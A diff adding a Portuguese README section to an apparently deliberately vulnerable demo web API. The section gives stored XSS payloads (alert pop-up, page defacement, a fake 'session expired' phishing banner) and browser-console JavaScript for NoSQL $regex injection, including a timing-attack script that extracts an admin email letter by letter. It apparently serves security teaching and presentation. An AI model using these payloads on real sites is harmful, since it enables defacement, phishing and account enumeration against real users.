@@ -121,6 +121,144 @@ src/
 	utils/
 ```
 
+## Explorando Vulnerabilidades
+
+> **Ambientes**
+> - 🔴 Projeto **inseguro** (dev): https://apiinjection-dev-8cwcq9.azurewebsites.net
+> - 🟢 Projeto **corrigido** (prod): https://apiinjection-prod-1j5nxa.azurewebsites.net
+> - 📦 Repositório: https://github.com/ArthurGomes11/api-injection-test
+
+---
+
+### 1 — Stored XSS: Pop-up de alerta
+
+Cole o payload abaixo no campo **Nome** ao criar um produto (versão insegura).
+Um atacante autenticado como admin consegue executar JavaScript no browser de todos os visitantes.
+
+```html
+<img src="x" onerror="alert('Vulnerabilidade XSS Detetada na Aplicação!');">
+```
+
+---
+
+### 2 — Stored XSS: Imagem externa injetada
+
+Cole no campo **Descricao** para exibir uma imagem arbitrária vinda de qualquer domínio.
+
+```html
+<img src="https://pbs.twimg.com/media/G85YFqzW8AAWmAm.jpg" style="width: 100%; height: 200px; object-fit: cover; border-radius: 8px; margin-top: 10px; display: block;">
+```
+
+---
+
+### 3 — Stored XSS: Payload agressivo — sobrescreve a página inteira
+
+Cole no campo **Nome** ou **Descricao**. Vai cobrir todo o conteúdo do site com uma tela preta.
+Usar no final da apresentação.
+
+```html
+<style>
+  body::after {
+    content: "SITE HACKEADO";
+    position: fixed; top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    background-color: black; color: lime;
+    font-size: 50px; text-align: center;
+    padding-top: 20vh; z-index: 9999;
+  }
+</style>
+```
+
+---
+
+### 4 — Stored XSS: Phishing — sessão falsa expirada
+
+Injeta uma mensagem falsa de "sessão expirada" com link malicioso, escondendo os produtos reais.
+
+```html
+<style>
+  .products-list { display: none; }
+  body::before {
+    content: "⚠️ SESSÃO EXPIRADA. Por favor, faça login novamente no link: bit.ly/site-falso";
+    display: block; background: yellow; color: black;
+    padding: 20px; font-weight: bold; text-align: center;
+  }
+</style>
+```
+
+---
+
+### 5 — NoSQL Injection: Enumeração de e-mails via regex
+
+Execute no console do browser (F12) na versão **insegura**.
+O campo `email` aceita um objeto MongoDB com `$regex`, permitindo descobrir se um e-mail existe pelo tempo de resposta.
+
+```js
+fetch('/api/auth/login', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    email: { "$regex": "^j" },
+    password: "senha_errada"
+  })
+}).then(() => console.log("Se demorou ~100ms ou mais, um email com 'j' existe"));
+```
+
+---
+
+### 6 — NoSQL Injection + Timing Attack: Brute force de e-mail caractere a caractere
+
+Execute no console do browser (F12) na versão **insegura**.
+Combina `$regex` com medição de tempo de resposta para extrair o e-mail do admin letra por letra.
+
+```js
+async function extrairDadosEstavel() {
+    const caracteres = "admin@loja.com123456789-_.";
+    let descoberto = "";
+    const tentativasPorLetra = 3;
+
+    console.log("%c🛡️ Iniciando Extração de Alta Precisão...", "color: white; background: #0078d4; padding: 5px;");
+
+    while (descoberto.length < 20) {
+        let resultados = [];
+
+        for (let char of caracteres) {
+            const teste = "^" + descoberto + char;
+            let somaTempos = 0;
+
+            for (let i = 0; i < tentativasPorLetra; i++) {
+                const t0 = performance.now();
+                await fetch('/api/auth/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email: { "$regex": teste }, password: "x" })
+                });
+                somaTempos += (performance.now() - t0);
+            }
+
+            const media = somaTempos / tentativasPorLetra;
+            resultados.push({ char, media });
+        }
+
+        resultados.sort((a, b) => b.media - a.media);
+        const vencedora = resultados[0];
+
+        if (vencedora.media < 60) break;
+
+        descoberto += vencedora.char;
+        console.log(`%c[+] Confirmado: ${descoberto} (Média: ${Math.round(vencedora.media)}ms)`, "color: lime;");
+
+        if (descoberto === "admin@loja.com") break;
+    }
+
+    console.log("%c🎯 EXTRAÇÃO FINALIZADA: " + descoberto, "color: #ff00ff; font-size: 16px; font-weight: bold;");
+}
+
+extrairDadosEstavel();
+```
+
+---
+
 ## Deploy no Azure com Terraform
 
 Foi adicionada uma estrutura Terraform para subir a API em Azure App Service com container Docker.
